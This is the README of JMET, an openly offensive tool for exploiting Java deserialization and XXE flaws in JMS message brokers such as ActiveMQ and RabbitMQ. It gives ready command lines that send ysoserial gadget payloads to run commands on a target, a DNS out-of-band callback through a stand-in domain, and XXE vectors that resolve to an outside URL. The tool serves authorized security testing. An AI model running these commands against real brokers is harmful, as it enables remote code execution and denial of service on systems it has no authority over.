# JMET
The Java Message Exploitation Tool
```ascii
       ____  _______________
      / /  |/  / ____/_  __/
 __  / / /|_/ / __/   / /   
/ /_/ / /  / / /___  / /    
\____/_/  /_/_____/ /_/
```

# Description
JMET was released at Blackhat USA 2016 and is an outcome of Code White's research
effort presented in the talk "Pwning Your Java Messaging With
Deserialization Vulnerabilities".
The goal of JMET is to make the exploitation of the Java Message Service (JMS) easy.
In the talk more than 12 JMS client implementations where shown, vulnerable to
deserialization attacks.
The specific deserialization vulnerabilities were found in ObjectMessage implementations
(classes implementing javax.jms.ObjectMessage).
The following more or less complete list shows the vulnerable JMS broker client
libraries:
* Apache ActiveMQ
* Redhat/Apache HornetQ
* Oracle OpenMQ
* IBM WebSphereMQ
* Oracle Weblogic
* Pivotal RabbitMQ
* IBM MessageSight
* IIT Software SwiftMQ
* Apache ActiveMQ Artemis
* Apache QPID JMS
* Apache QPID Client
* Amazon SQS Java Messaging

For creating gadget payloads JMET makes use of Chris Frohoffs' Ysoserial.

# Supprted JMS client libraries
* Apache ActiveMQ
* Redhat/Apache HornetQ
* Oracle OpenMQ
* IBM WebSphereMQ
* ~~Oracle Weblogic~~
* Pivotal RabbitMQ
* ~~IBM MessageSight~~
* IIT Software SwiftMQ
* Apache ActiveMQ Artemis
* Apache QPID JMS
* Apache QPID Client
* ~~Amazon SQS Java Messaging~~

# Dependencies
JMET depends on a lot of libraries :(. For details see the maven pom file.

JMET works with Java 8. Expect unpleasant surprises with Java 11.

# Installation
Just download jmet-0.1.0-all.jar from here or built it (see "Build instructions").

# Usage

```ascii
$ java -jar target/jmet-0.1.0-all.jar
ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I
usage: jmet [host] [port]
 -C,--Custom <scriptname>         Custom script exploitation mode
 -f,--filter <scriptname>         filter script
 -I,--impl <arg>                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|
                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|
                                  OpenMQ
 -pw,--password <pass>            password for authentication
 -Q,--Queue <name>                queue name
 -s,--substitute                  Substituation mode: Use §§ to pass
                                  ysoserial payload name to CMD
 -T,--Topic <name>                topic name
 -u,--user <id>                   user for authentication
 -v,--verbose                     Running verbose mode
 -X,--XXE <URL>                   XXE exploitation mode
 -Xp,--xxepayload <payloadname>   Optional: XXE Payload to use EXTERNAL|
                                  PARAMATER| DTD
 -Y,--ysoserial <CMD>             Deser exploitation mode
 -Yp,--payload <payloadname>      Optional: Ysoserial Payload to use
                                  BeanShell1| CommonsBeanutils1|
                                  CommonsCollections1|
                                  CommonsCollections2|
                                  CommonsCollections3|
                                  CommonsCollections4|
                                  CommonsCollections5| Groovy1|
                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|
                                  ROME| Spring1| Spring2
 -Zc,--channel <channel>          channel name (only WebSphereMQ)
 -Zq,--queuemanager <name>        queue manager name (only WebSphereMQ)
 -Zv,--vhost <name>               vhost name (only AMQP-Brokers:
                                  RabbitMQ|QPid09|QPid10)
```
## Gadget exploitation mode
Create gadgets for executing "xterm" and send them all to queue "event".
As implementation ActiveMQ is choosen, the target system is "jmstarget" listening
on port 61616.
```bash
$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y xterm jmstarget 61616
```
To find out which gadget was executed you can use the "substitution"-mode with
 an out-of-band channel like DNS. To pass the gadget name to your command use
 the "§§" string which then gets substituted with the gadget name.

```bash
$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "nslookup §§.yourdomain.com" jmstarget 61616
```
## XXE exploitation mode
The XXE exploition mode requires to specify an URL to be resolved as an
external entity. The XXE vectors are sent inside a TextMessage.
```bash
$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -X http://192.168.85.148:8081 jmstarget 61616
```
## Custom exploitation mode
The custom exploitation mode allows to run a custom JavaScript script.
The purpose of this mode is to support different serialization formats (JSON, etc.)
and custom payloads.

The following example script uses the XML serialization library XStream.
The String "Object" is serialized to XML and put into an TextMessage using the
de.codewhite.jmet.target.JMSTarget.addTextPayload(String payloadName, String payloadText)-method.
Required libraries need to be put into the "external"-directory of JMET.
```javascript
function payload(target){

        var imports = new JavaImporter(java.io, java.lang, com.thoughtworks.xstream);
        with (imports) {

            xstream = new XStream();
            target.addTextPayload("test",xstream.toXML("Object"));

        }
}
```

## Filter scripts
Filter scripts are used for modifying "javax.jms.Message"-instances before sent
to the target destination.
The following Javascript changes the JMSPriority of every message, prints out
a string und returns the modified message back.
```javascript
function filter(message){

    message.setJMSPriority(3);
    print("Changed Priority")
    return message;

}
```

# Build instructions
Please put the following libraries of the commercial brokers into a
directory of your choice (e.g. DIR).

* com.ibm.mq.allclient.jar (WebSphere MQ)
* amqp.jar  (SwiftMQ)
* jms.jar (SwiftMQ)
* swiftmq.jar (SwiftMQ)

Then invoke maven with the property "commercial" set to your path.
```bash
$ export MAVEN_OPTS=-Xss10m
$ mvn clean compile assembly:single -Dcommerical=DIR
```

If you don't want to use the commercial brokers at all you can just delete
the following files:
* src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java
* src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java

```bash
$ export MAVEN_OPTS=-Xss10m
$ mvn clean compile assembly:single
```

Using Java 11 can result in builds never finishing, always use Java 8! If you have multiple installations, check that the `JAVA_HOME` environment variable points to the right version!

# Disclaimer
JMET is a proof-of-concept tool for blackbox testing of JMS destinations.
Please use this tool with care and only when authorized.
Be aware that sending an invalid message to a JMS destination might result in a denial-of-service
 state (DOS) of the target system.
 You have been warned !!!

# License
JMET is released under The MIT License (MIT).
